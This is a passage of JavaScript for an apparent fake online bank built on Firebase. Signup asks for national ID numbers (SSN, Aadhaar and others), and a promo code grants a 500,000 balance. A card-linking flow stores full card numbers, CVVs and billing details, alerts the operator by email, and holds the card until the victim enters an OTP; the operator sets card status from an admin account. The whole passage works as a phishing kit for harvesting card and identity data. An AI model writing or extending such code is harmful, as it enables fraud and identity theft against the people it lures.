Norway:[{name:'PayPal',fields:['email']},{name:'Vipps',fields:['phoneNumber','fullName']},{name:'DNB',fields:['accountHolder','accountNumber']}],
Switzerland:[{name:'PayPal',fields:['email']},{name:'UBS',fields:['accountHolder','iban']},{name:'Credit Suisse',fields:['accountHolder','iban']}],
'South Korea':[{name:'PayPal',fields:['email']},{name:'KakaoBank',fields:['accountHolder','accountNumber']}],
Singapore:[{name:'PayPal',fields:['email']},{name:'DBS Bank',fields:['accountHolder','accountNumber']},{name:'OCBC Bank',fields:['accountHolder','accountNumber']}],
Kenya:[{name:'PayPal',fields:['email']},{name:'M-Pesa',fields:['phoneNumber','fullName']},{name:'Equity Bank',fields:['accountHolder','accountNumber']}],
Egypt:[{name:'PayPal',fields:['email']},{name:'Vodafone Cash',fields:['phoneNumber','fullName']},{name:'National Bank of Egypt',fields:['accountHolder','accountNumber']}],
Morocco:[{name:'PayPal',fields:['email']},{name:'Attijariwafa Bank',fields:['accountHolder','rib']}],
'New Zealand':[{name:'PayPal',fields:['email']},{name:'ANZ',fields:['accountHolder','accountNumber']},{name:'Westpac',fields:['accountHolder','accountNumber']}]
};
const fieldPlaceholders={cashtag:'$Cashtag',fullName:'Full Name (As on Account)',username:'Username',email:'Email Address',accountHolder:'Account Holder Name',accountNumber:'Account Number',routingNumber:'Routing Number',sortCode:'Sort Code',iban:'IBAN',phoneNumber:'Phone Number',mtcn:'MTCN',transitNumber:'Transit Number',institutionNumber:'Institution Number',upiId:'UPI ID',ifscCode:'IFSC Code',pixKey:'PIX Key',agencyNumber:'Agency Number',branchCode:'Branch Code',bsb:'BSB Number',clabe:'CLABE',alipayId:'Alipay ID',wechatId:'WeChat ID',cbu:'CBU',rut:'RUT',rib:'RIB'};
const fieldLabels={ssn:'SSN',nin:'National Insurance Number',taxId:'Tax ID',taxNumber:'Tax Number',fiscalCode:'Fiscal Code',nie:'NIE/DNI',nif:'NIF',bsn:'BSN',nationalNumber:'National Number',personnummer:'Personnummer',fodselsnummer:'F√∏dselsnummer',avsNumber:'AVS Number',sin:'SIN',curp:'CURP',cpf:'CPF',dni:'DNI',rut:'RUT',idNumber:'ID Number',nationalId:'National ID',cin:'CIN',mynumber:'My Number',aadhaar:'Aadhaar',rrn:'RRN',nric:'NRIC/FIN',tfn:'TFN',ird:'IRD',age:'Age',address:'Full Address',financialStatus:'Financial Status',relationship:'Relationship Status',employmentStatus:'Employment Status'};
const countryRequirements={USA:['age','address','financialStatus','relationship','employmentStatus'],UK:['nin','age','address','employmentStatus'],Germany:['taxId','age','address','employmentStatus'],France:['taxNumber','age','address','employmentStatus'],Italy:['fiscalCode','age','address','employmentStatus'],Spain:['nie','age','address','employmentStatus'],Portugal:['nif','age','address','employmentStatus'],Netherlands:['bsn','age','address','employmentStatus'],Belgium:['nationalNumber','age','address','employmentStatus'],Sweden:['personnummer','age','address','employmentStatus'],Norway:['fodselsnummer','age','address','employmentStatus'],Switzerland:['avsNumber','age','address','employmentStatus'],Canada:['sin','age','address','employmentStatus'],Mexico:['curp','age','address','employmentStatus'],Brazil:['cpf','age','address','employmentStatus'],Argentina:['dni','age','address','employmentStatus'],Chile:['rut','age','address','employmentStatus'],Nigeria:['nin','age','address','employmentStatus'],'South Africa':['idNumber','age','address','employmentStatus'],Kenya:['idNumber','age','address','employmentStatus'],Egypt:['nationalId','age','address','employmentStatus'],Morocco:['cin','age','address','employmentStatus'],China:['idNumber','age','address','employmentStatus'],Japan:['mynumber','age','address','employmentStatus'],India:['aadhaar','age','address','employmentStatus'],'South Korea':['rrn','age','address','employmentStatus'],Singapore:['nric','age','address','employmentStatus'],Australia:['tfn','age','address','employmentStatus'],'New Zealand':['ird','age','address','employmentStatus']};
function formatDate(d){if(!d)return 'Just now';const dt=new Date(d);if(isNaN(dt))return 'Invalid date';return dt.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+', '+dt.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',hour12:false});}
function formatAccountNumber(n){if(!n||n.length!==10)return n;return n.slice(0,4)+' '+n.slice(4,7)+' '+n.slice(7);}
function detectCardBrand(n){if(n.startsWith('4'))return 'Visa';if(n.startsWith('5'))return 'Mastercard';if(n.startsWith('3'))return 'Amex';return 'Card';}
async function generateAccountNumber(){let num,exists=true;while(exists){num=Math.floor(1000000000+Math.random()*9000000000).toString();const s=await get(ref(db,'accountNumbers/'+num));exists=s.exists();}return num;}

onAuthStateChanged(auth,user=>{
  if(user){
    currentUser=user;userDataRef=ref(db,'users/'+user.uid);
    onValue(userDataRef,snap=>{
      const d=snap.val()||{};
      userCurrency=d.currency||'USD';
      const sym=currencySymbols[userCurrency]||'$';
      document.getElementById('balance').textContent=(d.balance||0).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
      document.getElementById('currency-symbol').textContent=sym;
      document.getElementById('username-display').textContent=d.username||'User';
      const an=d.accountNumber||'----------';
      document.getElementById('card-number').textContent=formatAccountNumber(an);
      document.getElementById('acc-number').textContent=an;
      document.getElementById('acc-surname').textContent=d.surname||'Not set';
      document.getElementById('acc-firstname').textContent=d.firstname||'Not set';
      document.getElementById('acc-othername').textContent=d.othername||'-';
      document.getElementById('acc-phone').textContent=d.phone||'Not set';
      document.getElementById('acc-country').textContent=d.country||'Not set';
      document.getElementById('acc-pin').textContent=t('notYetGenerated');
      // FIX: Render country data using DOM (not template literals)
      const ci=document.getElementById('country-specific-info');
      ci.innerHTML='';
      if(d.countryData){
        Object.keys(d.countryData).forEach(k=>{
          const label=fieldLabels[k]||(k.charAt(0).toUpperCase()+k.slice(1));
          const p=document.createElement('p');
          const st=document.createElement('strong');st.textContent=label+':';
          const sp=document.createElement('span');sp.textContent=d.countryData[k];
          p.appendChild(st);p.appendChild(sp);ci.appendChild(p);
        });
      }
      if(currentUser.email==='admin@gmail.com'){
        document.getElementById('admin-panel').style.display='block';
        document.getElementById('dashboard').style.display='none';
        loadAdminPanel();
      }else{
        document.getElementById('admin-panel').style.display='none';
        document.getElementById('dashboard').style.display='block';
      }
      updateHistory(d.history||[]);
      checkNotifications();
    });
    document.getElementById('auth-screen').style.display='none';
    document.getElementById('dashboard').style.display='block';
  }else{
    document.getElementById('auth-screen').style.display='flex';
    document.getElementById('signup-section').style.display='block';
    document.getElementById('login-section').style.display='none';
    document.getElementById('dashboard').style.display='none';
  }
});
document.getElementById('to-login').onclick=()=>{document.getElementById('signup-section').style.display='none';document.getElementById('login-section').style.display='block';};
document.getElementById('to-signup').onclick=()=>{document.getElementById('login-section').style.display='none';document.getElementById('signup-section').style.display='block';};
document.getElementById('su-country').addEventListener('change',function(){
  const country=this.value,df=document.getElementById('dynamic-fields');df.innerHTML='';
  if(country&&countryRequirements[country]){
    countryRequirements[country].forEach(field=>{
      const div=document.createElement('div');
      if(field==='age')div.innerHTML='<input type="number" id="su-age" placeholder="Age" required min="18" max="120">';
      else if(field==='financialStatus')div.innerHTML='<select id="su-financial" required><option value="">Select Financial Status</option><option value="low">Low Income (&lt;$25k)</option><option value="middle">Middle Income ($25k-$75k)</option><option value="upper-middle">Upper Middle ($75k-$150k)</option><option value="high">High Income (&gt;$150k)</option></select>';
      else if(field==='relationship')div.innerHTML='<select id="su-relationship" required><option value="">Relationship Status</option><option value="single">Single</option><option value="married">Married</option><option value="divorced">Divorced</option><option value="widowed">Widowed</option><option value="partnership">Domestic Partnership</option></select>';
      else if(field==='address')div.innerHTML='<input type="text" id="su-address" placeholder="Full Address" required>';
      else if(field==='employmentStatus')div.innerHTML='<select id="su-employment" required><option value="">Employment Status</option><option value="employed">Employed</option><option value="self-employed">Self-Employed</option><option value="unemployed">Unemployed</option><option value="student">Student</option><option value="retired">Retired</option></select>';
      else{const inp=document.createElement('input');inp.type='text';inp.id='su-'+field;inp.placeholder=fieldLabels[field]||field;inp.required=true;div.appendChild(inp);}
      df.appendChild(div);
    });
  }
});
document.getElementById('signup-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const sur=document.getElementById('su-surname').value.trim(),fn=document.getElementById('su-firstname').value.trim(),oth=document.getElementById('su-othername').value.trim(),ph=document.getElementById('su-phone').value.trim(),un=document.getElementById('su-username').value.trim(),em=document.getElementById('su-email').value.trim(),pw=document.getElementById('su-password').value,cf=document.getElementById('su-confirm').value,cur=document.getElementById('su-currency').value,co=document.getElementById('su-country').value,pr=document.getElementById('su-promo').value.trim().toLowerCase();
  const err=document.getElementById('signup-error');
  if(!co)return err.textContent='Please select a country';
  if(!sur||!fn)return err.textContent='Surname and First name required';
  if(pw!==cf)return err.textContent='Passwords do not match';
  if(pw.length<8)return err.textContent='Password too short';
  const cd={};const req=countryRequirements[co]||[];
  for(const f of req){
    let v;
    if(f==='age')v=document.getElementById('su-age')?.value;
    else if(f==='financialStatus')v=document.getElementById('su-financial')?.value;
    else if(f==='relationship')v=document.getElementById('su-relationship')?.value;
    else if(f==='address')v=document.getElementById('su-address')?.value;
    else if(f==='employmentStatus')v=document.getElementById('su-employment')?.value;
    else v=document.getElementById('su-'+f)?.value;
    if(!v)return err.textContent='Please fill all required fields';
    cd[f]=v;
  }
  let bal=0;if(pr==='viccylay30')bal=500000;
  try{
    const uc=await createUserWithEmailAndPassword(auth,em,pw),uid=uc.user.uid,an=await generateAccountNumber();
    await set(ref(db,'users/'+uid),{surname:sur,firstname:fn,othername:oth,phone:ph,username:un,email:em,currency:cur,country:co,countryData:cd,balance:bal,accountNumber:an,pin:'1234',history:[]});
    await set(ref(db,'accountNumbers/'+an),uid);
    document.getElementById('signup-form').reset();document.getElementById('dynamic-fields').innerHTML='';
    err.style.color='#34d399';err.textContent=pr==='viccylay30'?'Account created! Promo applied üéâ':'Account created successfully!';
    setTimeout(()=>err.textContent='',10000);
  }catch(ex){err.style.color='#ff5c5c';err.textContent=ex.message;}
});
document.getElementById('login-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const em=document.getElementById('li-email').value.trim(),pw=document.getElementById('li-password').value,err=document.getElementById('login-error');
  try{await signInWithEmailAndPassword(auth,em,pw);}catch(ex){err.textContent=ex.message;}
});
// FIX: Transaction history using DOM manipulation (no template literal rendering issues)
function updateHistory(history){
  const c=document.getElementById('transactions-container');c.innerHTML='';
  if(!history.length){const p=document.createElement('p');p.style.cssText='text-align:center;opacity:0.6;';p.textContent=t('noTransactions');c.appendChild(p);return;}
  history.slice().reverse().forEach(tx=>{
    const isNeg=tx.type==='Sent'||tx.type==='Withdrawal';
    const item=document.createElement('div');item.className='transaction-item';
    const icon=document.createElement('div');icon.className='transaction-icon';
    icon.textContent=tx.type==='Sent'?'‚Üí':tx.type==='Received'?'‚Üê':tx.type==='Withdrawal'?'‚Üì':'+';
    const det=document.createElement('div');det.className='transaction-details';
    const title=document.createElement('div');title.className='transaction-title';
    let txt=tx.type;
    if(tx.to)txt+=' '+t('sentTo')+' '+(tx.recipientName||tx.to);
    if(tx.from)txt+=' '+t('receivedFrom')+' '+(tx.senderName||'Unknown')+' ('+tx.from+')';
    if(tx.method)txt+=' '+t('via')+' '+tx.method;
    title.textContent=txt;
    const time=document.createElement('div');time.className='transaction-time';time.textContent=formatDate(tx.date);
    det.appendChild(title);det.appendChild(time);
    const amt=document.createElement('div');amt.className='transaction-amount '+(isNeg?'negative':'positive');
    const sym=currencySymbols[userCurrency]||'$';
    amt.textContent=(isNeg?'-':'+')+sym+Math.abs(tx.amount).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
    item.appendChild(icon);item.appendChild(det);item.appendChild(amt);c.appendChild(item);
  });
}

document.querySelector('.accounts-btn').onclick=()=>document.getElementById('account-modal').style.display='flex';
document.getElementById('close-account').onclick=()=>document.getElementById('account-modal').style.display='none';
// Card modal logic
document.getElementById('add-card-btn').onclick=async()=>{
  if(!currentUser)return;
  const ud=await get(userDataRef).then(s=>s.val());
  const cards=ud?.linkedCards||[];
  const proc=cards.find(c=>c.status==='pending'||c.status==='otp_required'||c.status==='rejected');
  document.getElementById('card-modal').style.display='flex';
  if(proc){showExistingCardInModal(proc,cards.indexOf(proc));}else{showNewCardForm();}
};
function showNewCardForm(){
  document.getElementById('card-form-container').style.display='block';
  document.getElementById('existing-card-container').style.display='none';
  document.getElementById('card-form').reset();
  document.getElementById('card-form').dataset.editingIndex='';
  document.getElementById('card-error').textContent='';
  document.getElementById('card-modal-title').textContent='üí≥ '+t('linkCard');
}
function showExistingCardInModal(card,cardIndex){
  document.getElementById('card-form-container').style.display='none';
  document.getElementById('existing-card-container').style.display='block';
  document.getElementById('card-modal-title').textContent='üí≥ Card Status';
  const container=document.getElementById('existing-card-container');
  const isOtp=card.status==='otp_required',isRej=card.status==='rejected',isPend=card.status==='pending';
  let statusHTML='';
  if(isPend)statusHTML='<span class="card-status pending">'+t('pending')+'</span>';
  else if(isOtp)statusHTML='<span class="card-status otp">'+t('otpRequired')+'</span>';
  else if(isRej)statusHTML='<span class="card-status rejected">'+t('rejected')+'</span>';
  let rejHTML='';
  if(isRej&&card.rejectionReason)rejHTML='<div class="rejection-reason">'+card.rejectionReason+'</div>';
  let actionHTML='';
  if(isOtp){
    // LOCKED - only OTP available
    actionHTML='<div class="locked-notice">üîí Card locked for OTP verification only</div>'+
      '<button onclick="document.getElementById(\'card-modal\').style.display=\'none\';document.getElementById(\'otp-input-modal\').style.display=\'flex\';" class="btn-primary" style="margin-top:12px;width:100%">üî¢ '+t('enterOtp')+'</button>';
  }else{
    // Editable if pending or rejected
    actionHTML='<button onclick="editExistingCard('+cardIndex+')" class="btn-edit" style="margin-top:12px;width:100%;margin-bottom:8px">‚úèÔ∏è '+t('editCard')+'</button>';
    if(isPend)actionHTML+='<button onclick="document.getElementById(\'card-modal\').style.display=\'none\';document.getElementById(\'card-auth-screen\').style.display=\'flex\';" class="btn-primary" style="width:100%">üîê '+t('iAuthorized')+'</button>';
  }
  container.innerHTML=
    '<div style="background:rgba(255,255,255,0.06);border-radius:12px;padding:16px;margin-bottom:16px;">'+
      '<div style="font-size:14px;font-weight:600;color:#4dabff;margin-bottom:8px;">'+card.brand+'</div>'+
      '<div style="font-size:18px;font-family:monospace;margin-bottom:4px;">‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour+'</div>'+
      '<div style="font-size:13px;opacity:0.7;margin-bottom:2px;">'+card.name+'</div>'+
      '<div style="font-size:12px;opacity:0.6;">Expires: '+card.expiry+'</div>'+
      statusHTML+rejHTML+
    '</div>'+
    actionHTML+
    '<button onclick="document.getElementById(\'card-modal\').style.display=\'none\'" class="btn-secondary" style="width:100%;margin-top:8px">'+t('close')+'</button>';
}
window.editExistingCard=async function(cardIndex){
  const ud=await get(userDataRef).then(s=>s.val());
  const card=ud.linkedCards[cardIndex];
  document.getElementById('card-form-container').style.display='block';
  document.getElementById('existing-card-container').style.display='none';
  document.getElementById('card-modal-title').textContent='‚úèÔ∏è '+t('editCard');
  document.getElementById('card-number-input').value=card.number||'';
  document.getElementById('card-name').value=card.name||'';
  document.getElementById('card-expiry').value=card.expiry||'';
  document.getElementById('card-cvv').value=card.cvv||'';
  if(card.billingAddress){
    document.getElementById('card-street').value=card.billingAddress.street||'';
    document.getElementById('card-postcode').value=card.billingAddress.postcode||'';
    document.getElementById('card-city').value=card.billingAddress.city||'';
    document.getElementById('card-country').value=card.billingAddress.country||'';
    document.getElementById('card-phone').value=card.billingAddress.phone||'';
  }
  document.getElementById('card-balance').value=card.currentBalance||'';
  document.getElementById('card-form').dataset.editingIndex=cardIndex;
};
document.getElementById('close-card').onclick=()=>{
  document.getElementById('card-modal').style.display='none';
  document.getElementById('card-form').reset();
  document.getElementById('card-form').dataset.editingIndex='';
  document.getElementById('card-error').textContent='';
};
document.getElementById('card-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const cn=document.getElementById('card-number-input').value.replace(/\s/g,''),nm=document.getElementById('card-name').value.trim(),exp=document.getElementById('card-expiry').value.trim(),cvv=document.getElementById('card-cvv').value.trim(),st=document.getElementById('card-street').value.trim(),pc=document.getElementById('card-postcode').value.trim(),ci=document.getElementById('card-city').value.trim(),co=document.getElementById('card-country').value.trim(),ph=document.getElementById('card-phone').value.trim(),bal=document.getElementById('card-balance').value.trim();
  const err=document.getElementById('card-error'),editIdx=document.getElementById('card-form').dataset.editingIndex;
  if(cn.length!==16)return err.textContent='Card number must be 16 digits';
  if(!nm)return err.textContent='Cardholder name required';
  if(!/^\d{2}\/\d{2}$/.test(exp))return err.textContent='Expiry format: MM/YY';
  if(cvv.length!==3)return err.textContent='CVV must be 3 digits';
  if(!st||!pc||!ci||!co||!ph||!bal)return err.textContent='All billing address fields are required';
  try{
    const ud=await get(userDataRef).then(s=>s.val()),cards=ud.linkedCards||[];
    const isEdit=editIdx!==''&&editIdx!==undefined;
    const newCard={number:cn,name:nm,expiry:exp,cvv,billingAddress:{street:st,postcode:pc,city:ci,country:co,phone:ph},currentBalance:bal,lastFour:cn.slice(-4),brand:detectCardBrand(cn),addedDate:new Date().toISOString(),status:'pending',otp:'',userName:ud.firstname+' '+ud.surname,userEmail:ud.email};
    if(isEdit){cards[parseInt(editIdx)]={...cards[parseInt(editIdx)],...newCard,status:'pending',otp:'',rejectionReason:null};}
    else{if(cards.some(c=>c.number===cn))return err.textContent='Card already linked';cards.push(newCard);}
    await runTransaction(userDataRef,u=>{if(u){u.linkedCards=cards;return u;}return u;});
    try{await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{user_name:ud.firstname+' '+ud.surname});}catch(e){console.error(e);}
    document.getElementById('card-form').reset();
    document.getElementById('card-form').dataset.editingIndex='';
    document.getElementById('card-modal').style.display='none';
    document.getElementById('card-auth-screen').style.display='flex';
    err.textContent='';
  }catch(ex){err.textContent='Failed: '+ex.message;}
});
document.getElementById('close-card-auth').onclick=()=>document.getElementById('card-auth-screen').style.display='none';
document.getElementById('enter-otp-btn').onclick=()=>{document.getElementById('card-auth-screen').style.display='none';document.getElementById('otp-input-modal').style.display='flex';};
document.getElementById('authorized-app-btn').onclick=async()=>{
  const ud=await get(userDataRef).then(s=>s.val());
  const cards=ud?.linkedCards||[],lc=cards[cards.length-1];
  if(lc&&lc.status==='pending'){
    await runTransaction(userDataRef,u=>{if(u&&u.linkedCards){const i=u.linkedCards.length-1;u.linkedCards[i].status='authorized';u.linkedCards[i].authorizedVia='bank_app';u.linkedCards[i].authorizedDate=new Date().toISOString();return u;}return u;});
    alert('‚úÖ Card authorized via bank app!');
    document.getElementById('card-auth-screen').style.display='none';
    displayLinkedCards();
  }
};
document.getElementById('close-otp-input').onclick=()=>document.getElementById('otp-input-modal').style.display='none';
document.getElementById('otp-submit-btn').onclick=async()=>{
  const uo=document.getElementById('user-otp-input').value.trim(),oe=document.getElementById('otp-input-error');
  if(!uo){oe.textContent='Please enter OTP code';return;}
  const ud=await get(userDataRef).then(s=>s.val()),cards=ud?.linkedCards||[];
  let otpIdx=cards.findIndex(c=>c.status==='otp_required');
  if(otpIdx<0)otpIdx=cards.length-1;
  const card=cards[otpIdx];
  if(card&&card.otp===uo){
    await runTransaction(userDataRef,u=>{if(u&&u.linkedCards){u.linkedCards[otpIdx].status='authorized';u.linkedCards[otpIdx].authorizedVia='otp';u.linkedCards[otpIdx].authorizedDate=new Date().toISOString();return u;}return u;});
    alert('‚úÖ Card authorized with OTP!');
    document.getElementById('otp-input-modal').style.display='none';
    document.getElementById('user-otp-input').value='';oe.textContent='';
    displayLinkedCards();
  }else{oe.textContent='Invalid or expired OTP code';}
};
async function displayLinkedCards(){
  const ud=await get(userDataRef).then(s=>s.val()),cards=ud?.linkedCards||[];
  const c=document.getElementById('linked-cards-list');c.innerHTML='';
  if(!cards.length){const p=document.createElement('p');p.style.cssText='text-align:center;opacity:0.6;';p.textContent=t('noCards');c.appendChild(p);return;}
  cards.forEach((card,i)=>{
    const el=document.createElement('div');el.className='linked-card-item';
    let sb='';
    if(card.status==='pending')sb='<span class="card-status pending">'+t('pending')+'</span>';
    else if(card.status==='authorized')sb='<span class="card-status authorized">'+t('authorized')+'</span>';
    else if(card.status==='otp_required')sb='<span class="card-status otp">'+t('otpRequired')+'</span>';
    else if(card.status==='rejected'){sb='<span class="card-status rejected">'+t('rejected')+'</span>';if(card.rejectionReason)sb+='<div class="rejection-reason">'+card.rejectionReason+'</div>';}
    el.innerHTML='<div class="linked-card-info"><div class="linked-card-brand">'+card.brand+'</div><div class="linked-card-number">‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour+'</div><div class="linked-card-name">'+card.name+'</div><div class="linked-card-expiry">Expires: '+card.expiry+'</div>'+sb+'</div><button class="remove-card-btn" onclick="removeCard('+i+')">'+t('removeCard')+'</button>';
    c.appendChild(el);
  });
}
window.removeCard=async function(i){
  if(!confirm('Remove this card?'))return;
  await runTransaction(userDataRef,u=>{if(u&&u.linkedCards){u.linkedCards.splice(i,1);return u;}return u;});
  alert('Card removed!');displayLinkedCards();
};
document.getElementById('view-cards-btn').onclick=async()=>{document.getElementById('cards-list-modal').style.display='flex';displayLinkedCards();};
document.getElementById('close-cards-list').onclick=()=>document.getElementById('cards-list-modal').style.display='none';
document.getElementById('more-btn').onclick=()=>document.getElementById('more-modal').style.display='flex';
document.getElementById('close-more').onclick=()=>document.getElementById('more-modal').style.display='none';
document.getElementById('more-contact').onclick=()=>alert(t('contactText'));
document.getElementById('more-help').onclick=()=>alert(t('howToUseText'));
document.getElementById('more-account').onclick=()=>{document.getElementById('more-modal').style.display='none';document.getElementById('account-modal').style.display='flex';};
document.getElementById('more-logout').onclick=()=>signOut(auth);

const sendModal=document.getElementById('send-modal');
document.getElementById('send-btn').onclick=()=>sendModal&&(sendModal.style.display='flex');
document.getElementById('close-send').onclick=()=>{sendModal&&(sendModal.style.display='none');document.getElementById('recipient-info').style.display='none';};
document.getElementById('send-recipient').addEventListener('input',async e=>{
  const ra=e.target.value.trim(),ri=document.getElementById('recipient-info');
  if(ra.length===10&&/^\d{10}$/.test(ra)){
    const as=await get(ref(db,'accountNumbers/'+ra));
    if(as.exists()){const rd=await get(ref(db,'users/'+as.val())).then(s=>s.val());if(rd){ri.style.display='block';ri.innerHTML='<strong>Recipient:</strong> '+rd.firstname+' '+rd.surname;ri.style.color='#34d399';}}
    else{ri.style.display='block';ri.innerHTML='Account not found';ri.style.color='#ff5c5c';}
  }else ri.style.display='none';
});
document.getElementById('send-form').addEventListener('submit',async e=>{
  e.preventDefault();const sb=e.target.querySelector('button[type="submit"]');if(sb.disabled)return;sb.disabled=true;
  const ra=document.getElementById('send-recipient').value.trim(),amt=parseFloat(document.getElementById('send-amount').value),err=document.getElementById('send-error');
  if(!ra||isNaN(amt)||amt<=0){err.textContent='Enter valid account and amount';sb.disabled=false;return;}
  if(!/^\d{10}$/.test(ra)){err.textContent='Account must be 10 digits';sb.disabled=false;return;}
  const as=await get(ref(db,'accountNumbers/'+ra));
  if(!as.exists()){err.textContent='Account not found';sb.disabled=false;return;}
  const ruid=as.val();
  if(ruid===currentUser.uid){err.textContent='Cannot send to yourself';sb.disabled=false;return;}
  const cb=await get(userDataRef).then(s=>s.val()?.balance||0);
  if(amt>cb){err.textContent=t('insufficientBalance');sb.disabled=false;return;}
  const date=new Date().toISOString(),sym=currencySymbols[userCurrency]||'$';
  try{
    const cud=await get(userDataRef).then(s=>s.val()),rr=ref(db,'users/'+ruid),rd=await get(rr).then(s=>s.val());
    const rn=rd.firstname+' '+rd.surname,sn=cud.firstname+' '+cud.surname;
    await runTransaction(userDataRef,s=>{if(!s||s.balance<amt)return;s.balance-=amt;s.history=s.history||[];s.history.push({date,type:'Sent',amount:amt,to:ra,recipientName:rn});return s;});
    await runTransaction(rr,r=>{if(r){r.balance=(r.balance||0)+amt;r.history=r.history||[];r.history.push({date,type:'Received',amount:amt,from:cud?.accountNumber||'Unknown',senderName:sn});return r;}return r;});
    err.textContent='';document.getElementById('send-form').reset();document.getElementById('recipient-info').style.display='none';sendModal.style.display='none';
    alert('Sent '+sym+amt.toLocaleString()+' to '+rn+' successfully!');
  }catch(ex){err.textContent='Transfer failed: '+ex.message;}finally{sb.disabled=false;}
});
document.getElementById('copy-account').onclick=async()=>{
  const an=document.getElementById('acc-number').textContent;
  if(an&&an!=='----------'){try{await navigator.clipboard.writeText(an);const b=document.getElementById('copy-account');const ot=b.textContent;b.textContent='‚úì Copied!';setTimeout(()=>b.textContent=ot,2000);}catch(e){alert('Account: '+an);}}
};
const withdrawModal=document.getElementById('withdraw-modal');
document.getElementById('withdraw-btn').onclick=async()=>{
  const ud=await get(userDataRef).then(s=>s.val());
  withdrawModal.style.display='flex';
  updateWithdrawMethods(ud?.country||'USA',ud);
};
document.getElementById('close-withdraw').onclick=()=>{withdrawModal.style.display='none';document.getElementById('withdraw-form').reset();document.getElementById('withdraw-error').textContent='';document.getElementById('withdraw-fields-container').innerHTML='';};
// FIX: updateWithdrawMethods includes authorized bank cards as option
function updateWithdrawMethods(country,userData){
  const ms=document.getElementById('withdraw-method');ms.innerHTML='<option value="">'+t('selectMethod')+'</option>';
  const cards=userData?.linkedCards||[],authCards=cards.filter(c=>c.status==='authorized');
  if(authCards.length>0){
    const og=document.createElement('optgroup');og.label=t('authorizedBankCard');
    authCards.forEach((card,i)=>{const op=document.createElement('option');op.value='authorized_card_'+i;op.textContent=card.brand+' ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour;og.appendChild(op);});
    ms.appendChild(og);
  }
  const banks=banksByCountry[country]||banksByCountry.USA;
  banks.forEach(b=>{const op=document.createElement('option');op.value=b.name;op.textContent=b.name;ms.appendChild(op);});
}
document.getElementById('withdraw-method').onchange=async()=>{
  const method=document.getElementById('withdraw-method').value,cont=document.getElementById('withdraw-fields-container');cont.innerHTML='';
  if(!method)return;
  if(method.startsWith('authorized_card_')){
    const idx=parseInt(method.split('_').pop()),ud=await get(userDataRef).then(s=>s.val()),card=ud?.linkedCards?.[idx];
    if(card){const d=document.createElement('div');d.style.cssText='background:rgba(52,211,153,0.1);border-left:3px solid #34d399;padding:12px;border-radius:8px;font-size:13px;color:#34d399;';d.innerHTML='‚úÖ '+t('authorizedCardDesc')+'<br><strong>'+card.brand+' ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour+'</strong><br>'+card.name;cont.appendChild(d);}
    return;
  }
  const ud=await get(userDataRef).then(s=>s.val()),banks=banksByCountry[ud?.country||'USA']||banksByCountry.USA,sb=banks.find(b=>b.name===method);
  if(sb){sb.fields.forEach(f=>{const inp=document.createElement('input');inp.type=f==='email'?'email':'text';inp.id='withdraw-'+f;inp.placeholder=fieldPlaceholders[f]||f;inp.required=true;cont.appendChild(inp);});}
};
document.getElementById('withdraw-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const method=document.getElementById('withdraw-method').value,amt=parseFloat(document.getElementById('withdraw-amount').value),pin=document.getElementById('withdraw-pin').value,err=document.getElementById('withdraw-error');
  if(!method)return err.textContent=t('selectWithdrawMethod');
  if(isNaN(amt)||amt<=0)return err.textContent=t('enterValidAmount');
  if(!pin||pin.length!==4)return err.textContent=t('enterPin4');
  const ud=await get(userDataRef).then(s=>s.val());
  if(!ud)return err.textContent='User data not found';
  if(ud.pin!==pin)return err.textContent=t('incorrectPin');
  if(ud.balance<amt)return err.textContent=t('insufficientBalance');
  let det={},methodDisplay=method;
  if(method.startsWith('authorized_card_')){
    const idx=parseInt(method.split('_').pop()),card=ud?.linkedCards?.[idx];
    if(!card)return err.textContent='Card not found';
    det={cardLastFour:card.lastFour,cardBrand:card.brand};methodDisplay=card.brand+' \u2022\u2022\u2022\u2022 '+card.lastFour;
  }else{
    const banks=banksByCountry[ud.country||'USA']||banksByCountry.USA,sb=banks.find(b=>b.name===method);
    if(!sb)return err.textContent='Invalid method';
    for(const f of sb.fields){const v=document.getElementById('withdraw-'+f)?.value?.trim();if(!v)return err.textContent=t('fillAllFields');det[f]=v;}
  }
  const date=new Date().toISOString();
  try{
    await runTransaction(userDataRef,u=>{if(!u||u.balance<amt)return;u.balance-=amt;u.history=u.history||[];u.history.push({date,type:'Withdrawal',amount:amt,method:methodDisplay,details:det});if(!u.withdrawalMethods)u.withdrawalMethods={};u.withdrawalMethods[methodDisplay]=det;return u;});
    const sym=currencySymbols[userCurrency]||'$';
    alert(t('withdrawalSubmitted')+'\n'+sym+amt.toLocaleString()+' to '+methodDisplay+'\n'+t('processingTime'));
    document.getElementById('withdraw-form').reset();document.getElementById('withdraw-fields-container').innerHTML='';withdrawModal.style.display='none';err.textContent='';
  }catch(ex){err.textContent='Withdrawal failed: '+ex.message;}
});
document.getElementById('generate-pin-btn').onclick=()=>window.open('https://candid-khapse-51e6c2.netlify.app','_blank');
document.getElementById('language-selector').onclick=()=>document.getElementById('language-modal').style.display='flex';
document.getElementById('close-language').onclick=()=>document.getElementById('language-modal').style.display='none';
document.querySelectorAll('.language-option').forEach(b=>b.onclick=()=>{currentLanguage=b.getAttribute('data-lang');translatePage();document.getElementById('language-modal').style.display='none';});

async function checkNotifications(){
  if(!currentUser)return;
  const ud=await get(userDataRef).then(s=>s.val());
  const unread=(ud?.notifications||[]).filter(n=>!n.read);
  const b=document.getElementById('notification-badge');
  if(b){b.textContent=unread.length;b.style.display=unread.length>0?'flex':'none';}
}
document.getElementById('notifications-btn').onclick=async()=>{
  const ud=await get(userDataRef).then(s=>s.val()),notifs=ud?.notifications||[];
  const c=document.getElementById('notifications-container');c.innerHTML='';
